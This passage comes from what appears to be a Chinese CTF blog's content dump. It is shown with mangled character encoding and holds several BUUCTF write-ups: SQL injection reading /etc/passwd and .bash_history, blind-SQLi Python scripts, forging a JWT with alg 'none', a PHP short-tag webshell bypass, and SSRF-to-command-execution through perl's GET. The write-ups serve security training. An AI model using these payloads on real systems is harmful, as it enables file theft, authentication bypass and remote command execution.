ä¸º`',content=user(),/*`å…¶å®ƒéšæ„ï¼Œç„¶åå»è¯¦æƒ…é‡Œé¢è¯„è®º`*/#` è¿™æ ·å°±ä¼šå›æ˜¾æˆ‘ä»¬å½“å‰ç”¨æˆ·ä¿¡æ¯ \n\n ç„¶åè¯­å¥ä¼šè¢«æ‹¼æ¥æˆä¸‹é¢è¿™æ ·\n\n```plain\ninsert into comment\n       set category = ' ',content=user()ï¼Œ/*',\n           content = '*/#',\n           bo_id = '$bo_id'\";\n```\n\nå³åŸæ¥çš„contentå†…å®¹è¢«æˆ‘ä»¬ç”¨æ³¨é‡Š`/**/`ç»™æ³¨é‡Šäº† æˆ‘ä»¬è‡ªå·±å¯ä»¥åˆ›å»ºä¸€ä¸ªcontentä»è€Œè¾¾åˆ°æˆ‘ä»¬æƒ³è¦çš„è¯­å¥\n\næ„é€ payload:`',content=user(),/*`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681457876263-11247f01-8e8e-4d7d-bc18-9f12b9db735c.png)\n\nå‘ç°æ˜¯rootæƒé™ è¿™å¯å¤ªè¡Œäº†\n\nç›´æ¥ç”¨load_file()å‡½æ•°å»è¯»æ–‡ä»¶\n\næ„é€ payload:`123',content=((select(load_file(\"/etc/passwd\")))),/*`\n\n```\ncategory=123',content=((select(load_file(\"/etc/passwd\")))),/*` æ³¨æ„ä¸€ä¸‹è¿™é‡Œcategoryé‡Œé¢æœ€å¥½éšä¾¿æ”¾ç‚¹å†…å®¹ å¦‚æœç›´æ¥æ˜¯ç©ºçš„ æ¯”å¦‚æ„é€ æˆè¿™æ ·`',content=((select(load_file(\"/etc/passwd\")))),/*\n```\n\né—­åˆè¿›å»ä¹‹åå°±ä¼šå˜æˆ`category=''`ç›´æ¥ä¸ºç©ºå­—ç¬¦ å¯èƒ½ä¼šæ— å›æ˜¾\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681458181723-73e833f2-d821-432c-9068-e596e2fdc3f6.png)\n\nå‘ç°æˆåŠŸè¯»å–\n\nçœ‹åˆ°æœ€åä¸€è¡Œ å‘ç°å­˜åœ¨wwwç”¨æˆ· é‚£ä¹ˆè¿™æ˜¯ä»€ä¹ˆå‘¢ ä¸€èˆ¬æˆ‘ä»¬åœ¨linuxä¸‹å®‰è£…webå¼€è®¾é¶åœº ä¸€èˆ¬é»˜è®¤ç³»ç»Ÿwebç”¨æˆ·ä¼šä¸ºwww\n\nä¸€èˆ¬å¢åŠ çš„ç”¨æˆ·ä¿¡æ¯ä¼šåœ¨/homeè·¯å¾„ä¸‹ rootæœ¬èº«çš„ä¿¡æ¯ä¼šåœ¨æ ¹ç›®å½•/rootè·¯å¾„é‡Œ\n\næ¯”å¦‚æˆ‘æ›¾ç»åœ¨æˆ‘çš„centos7ä¸Šè£…è¿‡å°çš®é¢æ¿ å°±ä¼šæœ‰ä¸ªwwwç”¨æˆ·é»˜è®¤åœ¨æˆ‘çš„/homeè·¯å¾„ä¸‹ï¼ˆé‚£ä¸ªappleç”¨æˆ·æ˜¯æˆ‘å½“æ—¶åˆ›å»ºçš„ç”¨æˆ· ï¼‰\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681459107727-6f72a691-4d4d-4bfb-978b-ec74ff3871b8.png)\n\nå¹¶ä¸”èƒ½çœ‹åˆ°åœ°å€ç›®å½•ä¸ºï¼š/home/www\n\næ„é€ payload:`123',content=((select(load_file(\"/home/www/.bash_history\")))),/*`\n\nè¿™é‡Œ.bash_historyæ–‡ä»¶æ˜¯ä»€ä¹ˆå‘¢ ä¸€èˆ¬åœ¨linux ä»¥`.`å¼€å¤´çš„éƒ½æ˜¯éšè—æ–‡ä»¶\n\n**åœ¨ç»ˆç«¯æ•²è¿‡çš„å‘½ä»¤ï¼Œlinuxæ˜¯æœ‰è®°å½•çš„ï¼Œé»˜è®¤å¯ä»¥è®°å½•500æ¡å†å²å‘½ä»¤ã€‚è¿™äº›å‘½ä»¤ä¿å­˜åœ¨ç”¨æˆ·çš„å®¿ä¸»ç›®å½•ä¸­çš„.bash_historyæ–‡ä»¶ä¸­ã€‚**\n\næ‹¿æˆ‘æœ¬åœ°appleç”¨æˆ·æ¥è¯´ï¼Œå¦‚ä¸‹\n\næˆ‘æ›¾ç»ä¿®æ”¹è¿‡appleç”¨æˆ·çš„å¯†ç  æ‰€ä»¥æœ‰è®°å½•\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681475557865-59d282b4-768a-4e0d-b4d2-4723531214e1.png)\n\nå›åˆ°é¢˜ç›®å¾—åˆ°\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681475942695-14971e8c-c568-4952-af18-e563d06b2d01.png)\n\nçœ‹åˆ°è®°å½•æœ‰ä¾æ¬¡å¦‚ä¸‹æ“ä½œï¼š\n\n1. `cd /tmp`\n2. `unzip html.zip`\n3. `rm -f html.zip`\n4. `cp -r html /var/www/`\n5. `cd /var/www/html/`\n6. `rm -f .DS_Store`\n7. `service apache2`\n\nä»–åªåˆ é™¤äº†åœ¨/var/www/htmlä¸‹çš„ .DS_Storeæ–‡ä»¶ åŸæ¥è·¯å¾„ä¸‹çš„.DS_Storeæ–‡ä»¶è¿˜ä¿å­˜ç€ æˆ‘ä»¬å¯ä»¥è¯»å–ï¼Œå¹¶ä¸”é‡Œé¢å†…å®¹è¯»å‡ºæ¥å¤§å¤šæ•°æ˜¯ä¹±ç  æœ€å¥½ä»¥hex()å‡½æ•°ä¹Ÿå°±æ˜¯16è¿›åˆ¶è¯»å‡ºæ¥\n\n .DS_Store(è‹±æ–‡å…¨ç§° Desktop Services Store)æ˜¯ä¸€ç§ç”±è‹¹æœå…¬å¸çš„Mac OS Xæ“ä½œç³»ç»Ÿæ‰€åˆ›é€ çš„éšè—æ–‡ä»¶ï¼Œç›®çš„åœ¨äºå­˜è´®ç›®å½•çš„è‡ªå®šä¹‰å±æ€§ï¼Œä¾‹å¦‚æ–‡ä»¶ä»¬çš„å›¾æ ‡ä½ç½®æˆ–è€…æ˜¯èƒŒæ™¯è‰²çš„é€‰æ‹©ã€‚ç›¸å½“äº Windows ä¸‹çš„ desktop.iniã€‚  \n\næ„é€ payloadï¼š`test',content=((select(hex(load_file(\"/tmp/html/.DS_Store\"))))),/*`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681476511756-e8b75674-d60e-4d5d-a7ce-31cf1e5ab0bf.png)\n\nå‘ç°äº†flagæ–‡ä»¶å  flag_8946e1ff1ee3e40f.php\n\nç„¶åå»è¯»å– æ„é€ payloadï¼š`test',content=((select(hex(load_file(\"/var/www/html/flag_8946e1ff1ee3e40f.php\"))))),/*`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681477444236-e9e3cfb8-9317-4232-8d52-18308f23d7fd.png)\n\nè½¬ç å¾—åˆ°flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681477495066-73d43d91-f33b-43a7-b0cf-182e906dd900.png)\n","tags":["sqlæ³¨å…¥","æºç æ³„éœ²"],"categories":["buuctf"]},{"title":"buuctf-86-[GYCTF2020]Ezsqli","url":"/post/d359692.html","content":"\n[GYCTF2020]Ezsqli\n\n<!--more-->\n\nä¸€çœ¼ä¸çœŸï¼Œé‰´å®šä¸ºsqlç›²æ³¨ã€‚\n\n## çˆ†åº“ï¼š\n\n```python\nimport requests #è°ƒrequestsæ¨¡å—\nimport time\nurl = 'http://b5c5750a-2950-4463-bba1-7eb101bc3c20.node4.buuoj.cn:81/'  \n#payload = {\"id\":\"0^(ascii(substr((select database()),1,1))>97)\"}\ndatabase = ''\nfor i in range (1,25):\n    for j in range(31,128):\n        payload = {\"id\":\"0^(ascii(substr((select database()),{},1))={})\".format(i,j)}\n        r = requests.post(url,data=payload)\n        time.sleep(0.005)\n        if 'Nu1L' in r.text:\n            database+=chr(j)\n            print(database)\n            continue\n        else:\n            pass\n# çˆ†åº“ give_grandpa_pa_pa_pa\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680942404461-ef13c20a-2bb9-45ae-8ff3-c0427fb9144b.png)\n\nåº“æ²¡ç”¨å…¶å®ï¼Œä¹‹åå¯ä»¥ç”¨database()ä»£æ›¿ è€Œä¸”andä¹Ÿæ˜¯è¢«æ²³èŸ¹äº† give_grandpa_pa_pa_pa  åº“åç”¨ä¸äº†çš„\n\n## çˆ†è¡¨ï¼š\n\nå› ä¸ºorè¢«æ²³èŸ¹\n\næ‰€ä»¥ä¸èƒ½ç”¨`information_schema`æ¥æŸ¥è¯¢ ç”¨`sys.x$schema_flattened_keys`æ¥ä»£æ›¿\n\nå‚è€ƒï¼šhttps://nosec.org/home/detail/3830.html\n\n```python\nimport requests #è°ƒrequestsæ¨¡å—\nimport time\nurl = 'http://b5c5750a-2950-4463-bba1-7eb101bc3c20.node4.buuoj.cn:81/'  \n#payload = {\"id\":\"0^ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),1,1))<103\"}\ntables = ''\nfor i in range (1,50):\n    for j in range(31,12):\n        payload = {\"id\":\"0^(ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),{},1))={})\".format(i,j)}\n        r = requests.post(url,data=payload)\n        time.sleep(0.005)\n        if 'Nu1L' in r.text:\n            tables+=chr(j)\n            print(tables)\n            continue\n        else:\n            pass\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680945616193-69eecadc-cb2f-454e-b445-ddf0fae6ee7d.png)\n\nä½¿ç”¨äºŒåˆ†æ³•æ”¹è¿›åï¼š\n\n```python\nimport requests #è°ƒrequestsæ¨¡å—\nimport time\nurl = 'http://b5c5750a-2950-4463-bba1-7eb101bc3c20.node4.buuoj.cn:81/'  \ntables = \"\"\nfor i in range (1,50):\n    low=31\n    high=127\n    mid = (low+high)//2\n    while low<=high:\n        payload = {\"id\":\"0^(ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),{},1))>{})\".format(i,mid)}\n        r = requests.post(url,data=payload)\n        if(\"Nu1L\" in r.text):\n            low=mid+1\n            mid = (low+high)//2\n        else:\n            high=mid-1\n            mid = (low+high)//2\n    tables+=chr(high+1)\n    print(tables)\n    time.sleep(0.3)\n```\n\n## çˆ†flag\n\nè¿™é‡Œç”¨åˆ°äº†åˆ—æ¯”è¾ƒå»è¯•flag\n\n![image.png](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682765495231-e76b1bfa-890e-434c-ac6e-8b375375bddf.png)\n\n`0^((1,'{0}')>(select * from f1ag_1s_h3r3_hhhhh))` è¿™é‡Œçš„ 1æ˜¯çŒœæµ‹ç¬¬ä¸€åˆ—ä¸€èˆ¬ä¸ºç´¢å¼•id 1ï¼Œå› æ­¤åœ¨è¿™é‡Œç”¨1ï¼Œä¹‹åå°±æ˜¯å»æ…¢æ…¢å†™è„šæœ¬å»è¯•å­—ç¬¦ï¼Œè¿™é‡Œå†™è„šæœ¬çš„æ—¶å€™è¦åŠ ä¸Šä¹‹å‰å·²ç»çˆ†å‡ºçš„å­—ç¬¦æ…¢æ…¢å»æ¯”è¾ƒã€‚\n\n\n\n```python\nimport requests #è°ƒrequestsæ¨¡å—\nimport time\nurl = 'http://b5c5750a-2950-4463-bba1-7eb101bc3c20.node4.buuoj.cn:81/'  \nflag = \"\"\nfor i in range (1,50):\n    low=31\n    high=127\n    mid = (low+high)//2\n    while low<=high:\n        flag_1 = flag + chr(mid)\n        payload = {\"id\":\"0^((1,'{0}')>(select * from f1ag_1s_h3r3_hhhhh))\".format(flag_1)}\n        r = requests.post(url,data=payload)\n        if(\"Nu1L\" in r.text):\n            high=mid-1\n            mid = (low+high)//2\n        else:\n            low=mid+1\n            mid = (low+high)//2\n    print(flag,chr(high))\n    flag+=chr(high)\n    time.sleep(2)\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680960278657-402336f5-111f-495a-982c-872e948175e1.png)\n","tags":["sqlæ³¨å…¥","sql bypass"],"categories":["buuctf"]},{"title":"buuctf-85-[HFCTF2020]EasyLogin","url":"/post/a8c0011c.html","content":"\n[HFCTF2020]EasyLogin\n\n<!--more-->\n\nä¸€é“å…³äºjwtè®¤è¯çš„é¢˜ç›® ä¹‹å‰æœ‰åšè¿‡ç›¸åŒçš„é¢˜ç›®\n\nç”³è¯·ä¸€ä¸ªè´¦å·ç™»å½•  ç„¶åå°±æ˜¯ä¸€ä¸ªè·å–flagçš„è¾“å…¥æ¡† ä½†æ˜¯æˆ‘ä»¬æ™®é€šèº«ä»½è‚¯å®šæ˜¯è·å–ä¸åˆ°çš„\n\nè¿™é‡Œæˆ‘è¯•äº†è¯•ç”³è¯·adminè´¦å·å‘ç°ä¸è¡Œ åšåˆ°è¿™é‡Œä¼°è®¡æ˜¯åé¢å¤§æ¦‚ç‡æ˜¯è¦ä¼ªé€ èº«ä»½ä¸ºadminç„¶ågetflag\n\næŸ¥çœ‹æºç å‘ç°æ˜¯ç”¨koaæ¡†æ¶\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681961292803-2507d542-7b9c-4425-9228-4b0c8129a613.png)\n\nç„¶åçœ‹äº†ä¸€ä¸‹åˆ«äººçš„wpè¿™ä¸ªæ¡†æ¶æ˜¯ç”¨jwté‰´æƒçš„\n\nå…³äºé‰´æƒå¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« https://juejin.cn/post/7003147063542153224\n\nç™»å½•æŠ“åŒ…\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681961802245-b79f5a21-698c-4857-8b2c-d169a365a871.png)\n\nå°†å…¶æ”¾å…¥https://jwt.io/ è‡ªåŠ¨å¸®æˆ‘ä»¬ç”Ÿæˆç›¸å…³ä¿¡æ¯\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681961865878-e174b300-c12c-44a4-bd80-b9f0908ae748.png)\n\nJWT(json web token)çš„ä¸‰ä¸ªéƒ¨åˆ†ä¾æ¬¡å¦‚ä¸‹ï¼šï¼ˆå‚è€ƒï¼šhttp://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.htmlï¼‰\n\n- Headerï¼ˆå¤´éƒ¨ï¼‰\n- Payloadï¼ˆè´Ÿè½½ï¼‰\n- Signatureï¼ˆç­¾åï¼‰\n\næ¯”å¦‚ï¼š`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MSwidXNlcm5hbWUiOiIxMjMiLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTY4MTk1OTg3N30.jJv8tD-ULxBStlglQIsVQgnR-nC7hbxsPJqOQiF_qJg`\n\nä¸‰éƒ¨åˆ†ä¹‹é—´ç”¨`.`é—´éš”\n\nè¿™é‡Œè¿™é‡Œç»•è¿‡éœ€è¦å°†algï¼ˆç®—æ³•ï¼‰æ”¹ä¸ºnone å°†secretidæ”¹ä¸º[]\n\nå› ä¸ºè¿™ä¸ªç½‘ç«™æ— æ³•æˆnoneåçš„jwtç¼–ç  æ‰€ä»¥åªèƒ½æ‰‹åŠ¨ç”Ÿæˆ ä¹Ÿå°±æ˜¯æ¯éƒ¨åˆ†base64ç¼–ç  ç„¶åå†ç”¨`.`è¿æ¥\n\nå› ä¸ºç®—æ³•å·²ç»æ˜¯noneäº†æ‰€ä»¥ä¸éœ€è¦ç¬¬ä¸‰æ®µç­¾åäº†\n\n```\n{\"alg\": \"none\",\"typ\": \"JWT\"}\neyJhbGciOiAibm9uZSIsInR5cCI6ICJKV1QifQ==\n{\"secretid\": [],\"username\": \"admin\",\"password\": \"123\",\"iat\": 1681959877}\neyJzZWNyZXRpZCI6IFtdLCJ1c2VybmFtZSI6ICJhZG1pbiIsInBhc3N3b3JkIjogIjEyMyIsImlhdCI6IDE2ODE5NTk4Nzd9\n```\n\n`eyJhbGciOiAibm9uZSIsInR5cCI6ICJKV1QifQ.eyJzZWNyZXRpZCI6IFtdLCJ1c2VybmFtZSI6ICJhZG1pbiIsInBhc3N3b3JkIjogIjEyMyIsImlhdCI6IDE2ODE5NTk4Nzd9.`æ³¨æ„è¿™é‡Œè™½ç„¶ç­¾åéƒ¨åˆ†è¢«çœç•¥äº† ä½†æ˜¯æœ€åä¸€ä¸ª`.`è¦åŠ ä¸Š å¹¶ä¸”ç­¾åä¸­base64ç¼–ç ä¸­ç”¨æ¥è¡¥ä½`==`è¦åˆ é™¤\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681962341963-9db7cc75-363b-4962-a3e9-305804f318ad.png)\n\næˆåŠŸä»¥adminèº«ä»½ç™»å…¥\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681962377789-ed8fda04-f829-4128-b346-0eaa7fd13958.png)\n\nè·å–flagå³å¯\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681962413236-6f1c0fae-a99c-4e2c-bb3b-b1eddb193dfd.png)\n\nå…¶å®è¿™é“é¢˜è¿˜æ˜¯å‰æœŸä¿¡æ¯æ£€ç´¢å»æ˜ç™½ä»–æ¡†æ¶æ˜¯jwté‰´æƒ\n","tags":["jwt"],"categories":["buuctf"]},{"title":"buuctf-79-[çº¢æ˜è°·CTF 2021]write_shell","url":"/post/51b0b22f.html","content":"\n[çº¢æ˜è°·CTF 2021]write_shell\n\n<!--more-->\n\n## ç¢ç¢å¿µï¼š\n\nè¿™é“é¢˜ç›®è¿˜æ˜¯è›®ç®€å•çš„ï¼Œè€ƒäº†phpçŸ­æ ‡ç­¾å’Œç©ºæ ¼ç»•è¿‡ï¼Œè¿˜æœ‰ä¸€ä¸ªåŒé—®å·è¡¨è¾¾å¼\n\n## è§£é¢˜ï¼š\n\næ”¾å‡ºæºç \n\n```plain\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\nfunction check($input){\n    if(preg_match(\"/'| |_|php|;|~|\\\\^|\\\\+|eval|{|}/i\",$input)){\n        // if(preg_match(\"/'| |_|=|php/\",$input)){\n        die('hacker!!!');\n    }else{\n        return $input;\n    }\n}\n\nfunction waf($input){\n  if(is_array($input)){\n      foreach($input as $key=>$output){\n          $input[$key] = waf($output);\n      }\n  }else{\n      $input = check($input);\n  }\n}\n\n$dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';\nif(!file_exists($dir)){\n    mkdir($dir);\n}\nswitch($_GET[\"action\"] ?? \"\") {\n    case 'pwd':\n        echo $dir;\n        break;\n    case 'upload':\n        $data = $_GET[\"data\"] ?? \"\";\n        waf($data);\n        file_put_contents(\"$dir\" . \"index.php\", $data);\n}\n?>\n```\n\né¦–å…ˆå°±æ˜¯é€šè¿‡ä½ çš„`sandbox+md5(ip)`åˆ›å»ºä¸€ä¸ªæ²™ç›’è·¯å¾„ è€å¥—è·¯äº†\n\nç„¶åè¿™é‡Œæœ‰ä¸¤ä¸ªé—®å·`??`å…ˆæ¥çœ‹çœ‹\n\nè¿™ç§æ˜¯æ¯”è¾ƒè¿ç®—ç¬¦ä¸­çš„NULL åˆå¹¶æ“ä½œç¬¦,ä»PHP7å¼€å§‹æä¾›,ä½œç”¨æ˜¯:ä»å·¦å¾€å³ç¬¬ä¸€ä¸ªå­˜åœ¨ä¸”ä¸ä¸º NULL çš„æ“ä½œæ•°ã€‚å¦‚æœéƒ½æ²¡æœ‰å®šä¹‰ä¸”ä¸ä¸º NULLï¼Œåˆ™è¿”å› NULL  \n\nå°±æ˜¯å¦‚æœc= a??b å¦‚æœaä¸º0 åˆ™c=b å¦‚æœaä¸ä¸º0 åˆ™c=a\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679661478990-0980b9d2-889c-49ef-a790-becc223c2860.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679661494898-f5c96b64-3163-4984-9ebb-6d5cfd802007.png)\n\nç„¶åå°±æ˜¯æœ‰ä¸¤ä¸ªæ¨¡å¼ ä¸€ä¸ªpwdå°±æ˜¯è¿”å›è·¯å¾„çš„ uploadæ¨¡å¼è®©æˆ‘æäº¤shellçš„ä½†æ˜¯æäº¤å‰ä¼šé€šè¿‡ä¸€ä¸ªç­›é€‰\n\nè¿‡æ»¤äº†`\"/'| |_|php|;|~|\\\\^|\\\\+|eval|{|}/i\"` `php eval {} ` ç©ºæ ¼éƒ½è¢«ç¦äº†\n\nå¦‚æœç›´æ¥æ„é€ `?data=ls%09/`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679661798378-610250da-1970-4ea0-92aa-8712ea9df795.png)\n\nåˆ™åªä¼šæ˜¾ç¤º ä¸ä¼šæ‰§è¡Œ é‚£ä¹ˆæˆ‘ä»¬éœ€è¦æ„é€ phpä»£ç å»æ‰§è¡Œæˆ‘ä»¬çš„linuxå‘½ä»¤ è¿™ä¹Ÿå°è¯äº†å‰é¢ä¸ºä»€ä¹ˆè¦ç¦phpå­—æ ·äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679661956409-64ad7724-461e-4519-adb7-e66b1a2ea3e7.png)\n\nä½†æ˜¯phpå­—æ ·è¢«ç¦ æ‰€ä»¥è¦ç”¨çŸ­æ ‡ç­¾äº† ä¸‹é¢äºŒé€‰ä¸€\n\n```\n<?echo%09`ls%09/`?>\n<?=`ls%09/`?>\n```\n\nè¿™é‡Œç»•è¿‡ç©ºæ ¼ ä¸èƒ½ç”¨`$IFS$9` ä¼°è®¡æ˜¯å› ä¸ºphpä¼šæŠŠè¿™ä¸ª`$`å½“ä½œå˜é‡æ¥è§£æå§ ç”¨%09ç»•è¿‡å°±è¡Œ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679662047463-b38f3a26-75d5-4987-b03b-70f5bd8d9244.png)\n\nç„¶åcatè¯»å‡ºæ¥å°±è¡Œäº†\n","tags":["bypass","phpçŸ­æ ‡ç­¾"],"categories":["buuctf"]},{"title":"buuctf-82-[HITCON 2017]SSRFme","url":"/post/8253ed9f.html","content":"\n[HITCON 2017]SSRFme\n\n<!--more-->\n\n## ç¢ç¢å¿µï¼š\n\nè¿™æ˜¯ä¸€é“ssrf ä¹Ÿå°±æ˜¯æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ çš„é¢˜ç›® å‘ç°è¿™æ ·çš„é¢˜ç›®å¸¸å¸¸ä¼šæœ‰ $_SERVERæ•°ç»„çš„åº”ç”¨ï¼Œè¿˜æ˜¯è›®ä¸é”™çš„qwq\n\n## è§£é¢˜ï¼š\n\nè¿›å…¥é¢˜ç›®ç»™å‡ºæºç ï¼š\n\n```plain\n10.244.80.206 <?php\n    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {\n        $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);\n        $_SERVER['REMOTE_ADDR'] = $http_x_headers[0];\n    }\n\n    echo $_SERVER[\"REMOTE_ADDR\"];\n\n    $sandbox = \"sandbox/\" . md5(\"orange\" . $_SERVER[\"REMOTE_ADDR\"]);\n    @mkdir($sandbox);\n    @chdir($sandbox);\n\n    $data = shell_exec(\"GET \" . escapeshellarg($_GET[\"url\"]));\n    $info = pathinfo($_GET[\"filename\"]);\n    $dir  = str_replace(\".\", \"\", basename($info[\"dirname\"]));\n    @mkdir($dir);\n    @chdir($dir);\n    @file_put_contents(basename($info[\"basename\"]), $data);\n    highlight_file(__FILE__);\n```\n\né¦–å…ˆç¬¬ä¸€éƒ¨åˆ†ifä½œç”¨å°±æ˜¯è·å–æˆ‘ä»¬çš„ip\n\nç„¶åç¬¬äºŒéƒ¨åˆ† æ ¹æ®æˆ‘ä»¬çš„ipåˆ›å»ºä¸€ä¸ªç”±md5åŠ å¯†çš„æ²™ç›’ ç„¶åé€‰æ‹©å®ƒ\n\nç¬¬ä¸‰éƒ¨åˆ† `shell_exec` æ‰§è¡Œæˆ‘ä»¬çš„ getåˆ°çš„ `GET+url`çš„å‘½ä»¤\n\nè¿™é‡Œç”¨åˆ°äº†linuxä¸­ GETå‘½ä»¤ \n\n GET è¿™ä¸ªå‘½ä»¤çš„ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œä¸»è¦æ˜¯ perl çš„ä¸€ä¸ªç‰¹ç‚¹ï¼Œåœ¨ open å¯ä»¥æ‰§è¡Œå‘½ä»¤å¹¶ä¸”è¿˜æ”¯æŒfileåè®®ã€‚  \n\n**æ³¨æ„ï¼šfile åè®®åˆ©ç”¨ open å‘½ä»¤æ‰§è¡Œ,è¦æ‰§è¡Œçš„å‘½ä»¤å…ˆå‰å¿…é¡»è¦æœ‰ä»¥å‘½ä»¤ä¸ºæ–‡ä»¶åçš„æ–‡ä»¶å­˜åœ¨**\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679655020115-9c486f4f-405b-44fe-93c6-564e21e45ae2.png)\n\nè¿™é‡Œä»¥å‘½ä»¤ä¸ºæ–‡ä»¶åçš„æ–‡ä»¶å¿…é¡»åŠ ä¸Šç®¡é“ç¬¦`|` å¦åˆ™ä¸è¡Œ,ä¸å¤ªæ˜ç™½è¿™é‡Œä¸ºä»€ä¹ˆä¸åŠ å°±ä¸è¡Œ\n\npathinfo â€” è¿”å›æ–‡ä»¶è·¯å¾„çš„ä¿¡æ¯\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679654422668-fd2e7ba0-b67a-4c25-801b-efb66dd197e1.png)\n\nä¹Ÿå°±æ˜¯åˆ›å»ºä¸€ä¸ªæˆ‘ä»¬ä¼ å…¥filenameçš„æ–‡ä»¶ ç„¶åé€‰æ‹©å®ƒ\n\nfile_put_contents â€” å°†æ•°æ®å†™å…¥æ–‡ä»¶ \n\nè¿™é‡Œä¹Ÿå°±æ˜¯æŠŠ$dataçš„å†…å®¹å†™å…¥ æˆ‘ä»¬çš„filenameçš„æ–‡ä»¶ä¸­\n\næ„é€ payloadï¼š`?url=file:ls /|&filename=ls /|`  è¿™é‡Œè¦æ‰§è¡Œä¸¤æ¬¡æ‰èƒ½æˆåŠŸ ä¹Ÿå°±æ˜¯æäº¤ä¸¤æ¬¡  ä¸ºä»€ä¹ˆè¦æäº¤ä¸¤æ¬¡å‘¢\n\nå› ä¸ºå‰é¢è¯´è¿‡ file åè®®åˆ©ç”¨ open å‘½ä»¤æ‰§è¡Œ,è¦æ‰§è¡Œçš„å‘½ä»¤å…ˆå‰å¿…é¡»è¦æœ‰ä»¥å‘½ä»¤ä¸ºæ–‡ä»¶åçš„æ–‡ä»¶å­˜åœ¨ \n\nç„¶åè¿™é‡Œä¸ºä»€ä¹ˆè¦åŠ åæ–œæ å‘¢ å› ä¸ºç®¡é“ç¬¦éœ€è¦æˆ‘ä»¬å»è½¬ä¹‰ä¸€ä¸‹\n\nå› æ­¤ç¬¬ä¸€æ¬¡æäº¤ æ˜¯è®©å»åˆ›å»ºä¸€ä¸ªä»¥å‘½ä»¤ä¸ºæ–‡ä»¶çš„æ–‡ä»¶  ç¬¬äºŒæ¬¡æ‰å»æ‰§è¡Œå¹¶ä¸”å°†æ‰§è¡Œç»“æœå†™å…¥åˆ°æ–‡ä»¶ä¸­å»\n\nç„¶åå†æ ¹æ®æˆ‘ä»¬çš„ip å»æ„é€ æ²™ç›’è·¯å¾„\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679655416854-884aeaf3-67e1-4957-8fec-aecb1fef681e.png)\n\næ„é€ payloadè®¿é—®ï¼š`/sandbox/2eeed2f9aeae6311b507ada8fb98809e/ls \\|`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679655471087-d0091932-4b56-4371-bdb7-0912c0535f48.png)\n\nçœ‹åˆ°æœ‰ä¸ªreadflag ç†è®ºæ¥è¯´ç›´æ¥æ‰§è¡Œ`./readflag`å°±å¯ä»¥äº† ä½†æ˜¯è¿™é‡Œä¸è¡Œ æˆ‘ä»¬è¦é€šè¿‡æ„é€ ä¸€ä¸ªä»¥å‘½ä»¤ä¸ºæ–‡ä»¶åçš„æ–‡ä»¶ç„¶åå»è®¿é—® å¦‚æœè¿™é‡Œæ„é€ ï¼š`/readflag`æ–‡ä»¶æ˜¯æ‰§è¡Œä¸äº†çš„ å› ä¸ºè¿™é‡Œå¿…é¡»æ˜¯`/readflag|` æ‰èƒ½æˆåŠŸæ‰§è¡Œ ä½†æ˜¯readflag| ä¸æ˜¯readflagæ–‡ä»¶å°±ç®—æ‰§è¡Œäº†ä¹Ÿæ²¡ç”¨\n\nå†è¯´ä¸€å¥ ä¸€èˆ¬è§åˆ°readflagè¿™æ ·çš„æ–‡ä»¶åå­— ç›´æ¥å»æ‰§è¡Œ è€Œä¸æ˜¯å»é€šè¿‡catè¿™æ ·çš„å‘½ä»¤å»è¯» å› ä¸ºreadflagé‡Œé¢æ˜¯ä»£ç  ç›´æ¥`./`æ‰§è¡Œå°±è¡Œäº†\n\næ„é€ ï¼š`?url=file:bash -c /readflag|&filename=bash -c /readflag|` ä¹Ÿæ˜¯å’Œä¸Šé¢ä¸€æ 